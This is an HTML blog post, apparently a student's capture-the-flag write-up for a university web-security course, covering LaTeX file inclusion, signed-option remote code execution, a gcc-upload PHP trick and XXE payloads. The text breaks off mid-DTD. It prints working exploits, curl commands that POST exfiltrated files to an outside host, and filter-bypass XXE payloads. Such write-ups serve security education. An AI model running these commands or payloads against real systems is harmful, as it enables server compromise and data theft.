@@ -1,0 +1,321 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Course CTF: Week 5 - COMP6443 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="Letters Site: letters."><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.58.2 with theme even"><link rel=canonical href=../../../post/course-ctf/week5/><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=manifest href=../../../manifest.json><link rel=mask-icon href=../../../safari-pinned-tab.svg color=#5bbad5><link href=../../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><link rel=stylesheet href=../../../css/typedjs.shortcode.css><meta property=og:title content="Course CTF: Week 5"><meta property=og:description content="Letters Site: letters."><meta property=og:type content=article><meta property=og:url content=/post/course-ctf/week5/><meta property=article:published_time content=2020-06-25T22:31:19+10:00><meta property=article:modified_time content=2020-06-25T22:31:19+10:00><meta itemprop=name content="Course CTF: Week 5"><meta itemprop=description content="Letters Site: letters."><meta itemprop=datePublished content=2020-06-25T22:31:19&#43;10:00><meta itemprop=dateModified content=2020-06-25T22:31:19&#43;10:00><meta itemprop=wordCount content=2114><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="Course CTF: Week 5"><meta name=twitter:description content="Letters Site: letters."><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../../ class=logo>COMP6443 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../../><li class=mobile-menu-item>Home</li></a><a href=https://github.com/featherbear/UNSW-COMP6443><li class=mobile-menu-item>GitHub</li></a><a href=../../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../../ class=logo>COMP6443 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../../>Home</a></li><li class=menu-item><a class=menu-item-link href=https://github.com/featherbear/UNSW-COMP6443>GitHub</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Course CTF: Week 5</h1><div class=post-meta><span class=post-time>2020-06-25</span><div class=post-category><a href=../../../categories/course-ctf/>Course CTF</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><a href=#letters>Letters</a><ul><li><a href=#lfi>LFI</a></li><li><a href=#rce>RCE</a></li></ul></li><li><a href=#gcc>gcc</a></li><li><a href=#feedifier>Feedifier</a><ul><li><a href=#v1>V1</a></li><li><a href=#v2>V2</a></li><li><a href=#v3>V3</a></li><li><a href=#v4>V4</a></li></ul></li></ul></nav></div></div><div class=post-content><h1 id=letters>Letters</h1><p>Site: letters.-QBSITE-</p><h2 id=lfi>LFI</h2><p>If we look at the source code of the app, we can see that our input is inserted into a markdown file, which is then processed with a template through <code>pandoc</code>. There is a route <code>/flag</code> that is only accessible by the administrator account - which when accessed will return the contents of the file <code>/flag</code>.</p><p>LaTeX allows us to insert data from the filesystem with <code>\input{FILENAME}</code></p><p>So we can enter in <code>\input{/flag}</code>, and the generated PDF should give us the flag</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=rce>RCE</h2><p>The debug option seems to allow extra parameters to be passed into <code>pandoc</code> through <code>--latex-engine-opt</code>.<br>However it appears to be signed, and we need to know the signing key.</p><p>Thankfully we do know it, from the <code>/key</code> file!<br>Through inserting <code>\input{/key}</code> into the markdown, we can get the key <code>imagineUsingW0rd</code>.<br>Here we can use the <code>itsdangerous</code> Python library to generate a signed version of whatever we want to pass in.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>s = itsdangerous.Signer(&#34;imagineUsingW0rd&#34;)</pre></td></tr></table></div></div><p>We can execute arbitrary commands in LaTeX with <code>\immediate\write18{YOUR_SCRIPT_HERE}</code> or <code>\input{|&quot;YOUR_SCRIPT_HERE&quot;}. However, we need to pass the</code>-shell-escape` option to the LaTeX engine&hellip; which is where the debug option comes in!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>s.sign(b&#34;-shell-escape&#34;)
+# b&#39;-shell-escape.ZYO1d05uy-FCZuQ_fSzoDfjkipM&#39;</pre></td></tr></table></div></div><p>By using this as our debug option, we can now perform some remote code execution on the server!</p><p>The first few things we want to check is what the filesystem looks like.<br>If trying to execute <code>ls</code> on its own, we get some syntax errors (as LaTeX then tries to process the RCE output as LaTeX syntax) - so we can <code>base64</code> encode it to receive it successfully.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>\input{|&#34;echo $(ls / | base64)&#34;}
+# YWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZgphcHAKYmluCmJvb3QKZGV2CmV0YwpmbGFnCmhvbWUKand0UlMyNTYua2V5LnB1YgprZXkKbGliCmxpYjY0Cm1lZGlhCm1udApvcHQKcHJvYwpxdW9jY2FiYW5rLnBuZwpyb290CnJ1bgpzYmluCnNydgpzeXMKdG1wCnVzcgp2YXIK</pre></td></tr></table></div></div><p>This gives us some files of interest to exfiltrate - especially <code>admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf</code>!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>\input{|&#34;base64 /admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf &gt; /tmp/b; curl -d &#39;@/tmp/b&#39; -X POST https://my.collection.site&#34;}</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p><em>We can also make a backup of some files, as it&rsquo;s a bit annoying to keep b64 decoding (no netcat on the server!):<br><code>\input{|&quot;tar -czf - . | base64 &gt; /tmp/hello.tar; curl -d &quot;@/tmp/hello.tar&quot; -X POST https://my.collection.site&quot;}</code></em></p><h1 id=gcc>gcc</h1><p>Site: gcc.-QBSITE-</p><p>The website compiles a <code>.c</code> file for us.<br>When GCC spits out warnings and errors, we can see those messages!</p><p>First, let&rsquo;s try upload an empty C file</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>/usr/lib/gcc/x86_64-alpine-linux-musl/8.3.0/../../../../x86_64-alpine-linux-musl/bin/ld: /usr/lib/gcc/x86_64-alpine-linux-musl/8.3.0/../../../../lib/Scrt1.o: in function `_start_c&#39;:
+/home/buildozer/aports/main/musl/src/musl-1.1.20/crt/crt1.c:17: undefined reference to `main&#39;
+collect2: error: ld returned 1 exit status</pre></td></tr></table></div></div><p>Next we can put a syntactically incorrect C file, I just pust the word <code>blah</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>/tmp/phpljIMeC.c:5:1: error: expected &#39;=&#39;, &#39;,&#39;, &#39;;&#39;, &#39;asm&#39; or &#39;__attribute__&#39; at end of input
+ blah
+ ^~~~</pre></td></tr></table></div></div><p>We know that the C file is uploaded to the <code>/tmp/</code> directory (As PHP does&hellip;).</p><p>What about finding where the working directory of the compiler is?</p><p>If we send a POST request to <code>/upload.php</code>, but remove the <code>fileToUpload</code> parameter we can leak the current working directory</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>Notice: Undefined index: fileToUpload in /quocca-gcc/upload.php on line 5
+not c file!</pre></td></tr></table></div></div><p>Cool, so <code>upload.php</code> is in <code>/quocca-gcc/</code>. Probably <code>download.php</code> too.</p><p>Using the <code>#include</code> directive, we can (partially) read contents of files through their syntax errors.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&#34;/quocca-gcc/upload.php&#34;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&#34;/quocca-gcc/download.php&#34;</span><span class=cp>
+</span><span class=cp></span><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{}</span></code></pre></td></tr></table></div></div><p>Sending this gives us some possible useful lines of source code.</p><p><strong>upload.php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>/*  1 */ <span class=cp>&lt;?php</span>
+<span class=cm>/*  2 */</span>   <span class=cm>/* ??? */</span>
+<span class=cm>/*  3 */</span>   <span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+<span class=cm>/*  4 */</span>   <span class=cm>/* ??? */</span>
+<span class=cm>/*  5 */</span>   <span class=k>if</span> <span class=p>(</span><span class=nx>strcmp</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;fileToUpload&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>],</span> <span class=o>-</span><span class=mi>2</span><span class=p>),</span> <span class=s2>&#34;.c&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+<span class=cm>/*  6 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/*  7 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/*  9 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/*  8 */</span>     <span class=nv>$fn</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;fileToUpload&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>],</span> <span class=s2>&#34;.c&#34;</span><span class=p>);</span>
+<span class=cm>/* 10 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 11 */</span>     <span class=nv>$fileName</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REQUEST_TIME&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;_&#39;</span> <span class=o>.</span> <span class=nv>$fn</span><span class=p>;</span>
+<span class=cm>/* 12 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 13 */</span>     <span class=k>echo</span> <span class=s2>&#34;Running gcc...&lt;br&gt;&#34;</span><span class=p>;</span>
+<span class=cm>/* 14 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 15 */</span>     <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;fileToUpload&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;fileToUpload&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;.c&#34;</span><span class=p>);</span>
+<span class=cm>/* 16 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 17 */</span>     <span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;gcc -o &#34;</span> <span class=o>.</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=s2>&#34;af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/&#34;</span> <span class=o>.</span> <span class=nv>$fileName</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;fileToUpload&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;.c 2&gt;&amp;1&#34;</span><span class=p>;</span>
+<span class=cm>/* 18 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 19 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 20 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 21 */</span>     <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;&#34;</span><span class=p>;</span>
+<span class=cm>/* 22 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 23 */</span>     <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
+<span class=cm>/* 24 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 25 */</span>     <span class=k>echo</span> <span class=s2>&#34;&lt;/pre&gt;&#34;</span><span class=p>;</span>
+<span class=cm>/* 26 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 27 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 28 */</span>     <span class=k>echo</span> <span class=s2>&#34;saved to &lt;a href=</span><span class=se>\&#34;</span><span class=s2>/download.php?binary=</span><span class=si>$fileName\</span><span class=s2>&#34;</span><span class=o>&gt;</span><span class=nx>here</span><span class=o>&lt;/</span><span class=nx>a</span><span class=o>&gt;</span>
+<span class=cm>/* 29 */</span>     <span class=cm>/* ??? */</span>
+<span class=cm>/* 30 */</span> <span class=cp>?&gt;</span>
+</code></pre></td></tr></table></div></div><p>Some important bits of information here is&hellip;<br>Line 5 - Our filename needs to end in <code>.c</code><br>Line 8 - The <code>.c</code> extension is stripped off<br>Line 17 - <code>gcc</code> outputs the compiled file into the <code>/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/</code> directory.</p><p><strong>download.php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>/*  1 */ /* ??? */
+/*  2 */ /* ??? */
+/*  3 */ if (strlen($f) &gt; 0) {
+/*  4 */     /* ??? */
+/*  5 */     /* ??? */
+/*  6 */     /* ??? */
+/*  7 */     header(&#39;Content-Description: File Transfer&#39;);
+/*  8 */     header(&#39;Content-Type: application/octet-stream&#39;);
+/*  9 */     header(&#39;Content-Disposition: attachment; filename=&#34;&#39;.basename($file).&#39;&#34;&#39;);
+/* 10 */     header(&#39;Expires: 0&#39;);
+/* 11 */     header(&#39;Cache-Control: must-revalidate&#39;);
+/* 12 */     header(&#39;Pragma: public&#39;);
+/* 13 */     header(&#39;Content-Length: &#39; . filesize($file));
+/* 14 */     /* ??? */
+/* 15 */     /* ??? */
+/* 16 */     /* ??? */
+/* 17 */     /* ??? */
+/* 18 */     /* ??? */
+/* 19 */     header(&#39;Content-Type: ctfproxy/error&#39;);
+/* 20 */     echo &#34;{\&#34;Code\&#34;: 404, \&#34;Description\&#34;: \&#34;Binary not found\&#34;}&#34;</code></pre></td></tr></table></div></div><p>From analysing how the program runs usually, this file seems to grab a file from the <code>/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets</code>
+Perhaps there&rsquo;s something here&hellip; but we don&rsquo;t know yet.</p><p>There also exists a <code>flag.php</code> file, which we can get from a recon scan.</p><p>If we just try the <code>#include &quot;/quocca-gcc/flag.php</code> method, we don&rsquo;t get anything useful back.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></pre></td><td class=lntd><pre class=chroma>Running gcc...&lt;br&gt;&lt;pre&gt;In file included from /tmp/phpNLICoA.c:3:
+/quocca-gcc/flag.php:1:1: error: expected identifier or &#39;(&#39; before &#39;&lt;&#39; token
+ &lt;?php
+ ^</pre></td></tr></table></div></div><p>We can try another way though to get the first line&hellip;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=cp>#define str(x) #x
+</span><span class=cp></span>
+<span class=n>str</span><span class=p>(</span>
+<span class=cp>#include</span> <span class=cpf>&#34;/quocca-gcc/flag.php&#34;</span><span class=cp>
+</span><span class=cp></span><span class=p>)</span>
+<span class=kt>int</span> <span class=n>main</span><span class=p>()</span> <span class=p>{}</span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></pre></td><td class=lntd><pre class=chroma>Running gcc...&lt;br&gt;&lt;pre&gt;In file included from /tmp/phpaIcGLG.c:4:
+/quocca-gcc/flag.php:3: error: unterminated argument list invoking macro &#34;str&#34;
+ // I removed the hard-coded flag and moved it to environment variable
+ 
+/tmp/phpaIcGLG.c:5:1: error: expected &#39;=&#39;, &#39;,&#39;, &#39;;&#39;, &#39;asm&#39; or &#39;__attribute__&#39; before &#39;)&#39; token
+ )
+ ^</pre></td></tr></table></div></div><p>Great, we&rsquo;ve gotten some part of the file&hellip; but it looks like it&rsquo;s not in the <code>flag.php</code> file, but rather the environment variable!<br>Trying directory traversal around the server with the <code>#include</code> method didn&rsquo;t get us very far - nothing useful that I could find.<br>We can&rsquo;t exploit any passed variables with <code>upload.php:23</code> either as everything is escaped correctly.</p><p>Noo!!</p><p>We need a new approach!</p><p>There are several ways to get access to environment table - but one thing in common, is that all these methods need some sort of RCE.</p><p>In Linux, we can use the the <code>env</code> command.<br>With PHP we can use <code>system('env')</code> to run the env command - or <code>phpinfo()</code> which spits out a nicely formatted webpage.<br>We won&rsquo;t be able to use our syntax error leak technique though - as the C preprocessor won&rsquo;t execute any commands.</p><p>One thing we need to realise, is that the <code>gcc.-QBSITE-</code> site serves its files from the <code>/quocca-gcc</code> directory.<br>That means that <code>/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/</code> is accessible through the internet without using <code>download.php</code>!</p><p>We can test this by submitting a valid C program, and extracting the compiled filename from the compiler log.</p><blockquote><p>i.e. <code>saved to &lt;a href=&quot;/download.php?binary=1593172586_app&quot;&gt;here&lt;/a&gt;</code> -&gt; <code>1593172586_app</code>.<br>This file is accessible at <code>https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/1593172586_app</code>.</p></blockquote><p>So, what this MEANS is that, if we can put PHP code into our compiled binary, and have the filename end with <code>.php</code>, the server will execute contents of the compiled binary, thinking that it is a PHP file!</p><p>We know from <code>upload.php:8</code> that the uploaded filename must end with <code>.c</code>, but we also know that it strips off the <code>.c</code> at the end.<br>This means that we can craft our filename as <code>something.php.c</code>, which would then be compiled as <code>something.php</code>!</p><p>File: <code>win.php.c</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=kt>char</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=s>&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class=p>;</span>
+<span class=kt>int</span> <span class=nf>main</span> <span class=p>()</span> <span class=p>{}</span></code></pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=feedifier>Feedifier</h1><h2 id=v1>V1</h2><p>Site: v1.feedifier.-QBSITE-</p><p>RSS files are basically XML files.<br>XML files can be exploited with XML External Entity attacks</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-rss data-lang=rss><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-rss data-lang=rss><span class=cp>&lt;!DOCTYPE ree [
+</span><span class=cp>  &lt;!ENTITY xxe SYSTEM &#34;file:///flag_ef031e0a08a1795a5649ac7792ee9390&#34;&gt;</span>
+]&gt;
+<span class=nt>&lt;rss&gt;</span>
+	<span class=nt>&lt;channel&gt;</span>
+		<span class=nt>&lt;item&gt;</span>
+			<span class=nt>&lt;title&gt;&lt;/title&gt;</span>
+			<span class=nt>&lt;link&gt;&lt;/link&gt;</span>
+			<span class=nt>&lt;description&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/description&gt;</span>
+		<span class=nt>&lt;/item&gt;</span>
+	<span class=nt>&lt;/channel&gt;</span>
+<span class=nt>&lt;/rss&gt;</span></code></pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=v2>V2</h2><p>Site: v2.feedifier.-QBSITE-</p><p>Version 2 of feedifier stops you from being able to use certain keywords in the requested feed.</p><p><code>flag</code> -&gt; Bad word detected!<br><code>file:/</code> -&gt; Bad word detected!</p><p>But, it doesn&rsquo;t stop us from putting these instructions in another file that be requested!</p><p>Using an external Document Type Definition (DTD) file, we can pass in our payload.<br>We also need to use what is known as a &ldquo;parameter entity&rdquo;.</p><blockquote><p>These entities could only be substituted inside the XML structure. However, there is something called parameter entities which could be defined as well as called inside the DOCTYPE itself. They are denoted by &ldquo;% &rdquo; followed by entity name.</p></blockquote><p><strong>RSS</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+
+<span class=cp>&lt;!DOCTYPE a [
+</span><span class=cp>	&lt;!ENTITY % ext SYSTEM &#34;http://sandbox.server/dtd&#34;&gt;</span>
+	%ext;
+]&gt;
+
+<span class=nt>&lt;rss&gt;</span>
+	<span class=nt>&lt;channel&gt;</span>
+		<span class=nt>&lt;item&gt;</span>
+			<span class=nt>&lt;title&gt;&lt;/title&gt;</span>
+			<span class=nt>&lt;link&gt;&lt;/link&gt;</span>
+			<span class=nt>&lt;description&gt;</span><span class=ni>&amp;ext;</span><span class=nt>&lt;/description&gt;</span>
+		<span class=nt>&lt;/item&gt;</span>
+	<span class=nt>&lt;/channel&gt;</span>
+<span class=nt>&lt;/rss&gt;</span></code></pre></td></tr></table></div></div><p><strong>DTD</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;!ENTITY % file SYSTEM &#34;file:///flag_20e629e407d2d93bf15162e0ed259cf9&#34;&gt;</span>
+<span class=cp>&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;%file;&#39;&gt;</span>&#34;&gt;
+%eval;
+%error;</code></pre></td></tr></table></div></div><p>(Payload to trigger the XXE)<br>Source: <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a><br>Source: <a href=https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><h2 id=v3>V3</h2><p>Site: v3.feedifier.-QBSITE-</p><p>This time, DTD files are also checked against the filter, which means we need to piece together the file resource string.</p><p>I tried to do some OOB - sending the flag over a GET request&hellip; but it seemed that PHP wasn&rsquo;t installed on the server, meaning that I couldn&rsquo;t use the <code>php://filter/convert.base64-encode</code> method (Some characters in the flag can&rsquo;t be transmitted over the network without being encoded). But, we can still get the flag through error-based methods!</p><p><strong>RSS</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+
+<span class=cp>&lt;!DOCTYPE data [
+</span><span class=cp>	&lt;!ENTITY % file SYSTEM &#34;http://sandbox.server/dtd&#34;&gt;</span>
+	%file;
+	%prepare;
+	%send;
+]&gt;
+
+<span class=nt>&lt;rss&gt;</span>
+	<span class=nt>&lt;channel&gt;</span>
+		<span class=nt>&lt;item&gt;</span>
+			<span class=nt>&lt;title&gt;&lt;/title&gt;</span>
+			<span class=nt>&lt;link&gt;&lt;/link&gt;</span>
+			<span class=nt>&lt;description&gt;&lt;/description&gt;</span>
+		<span class=nt>&lt;/item&gt;</span>
+	<span class=nt>&lt;/channel&gt;</span>
+<span class=nt>&lt;/rss&gt;</span></code></pre></td></tr></table></div></div><p><strong>DTD</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;!ENTITY % A &#34;file:&#34;&gt;</span>
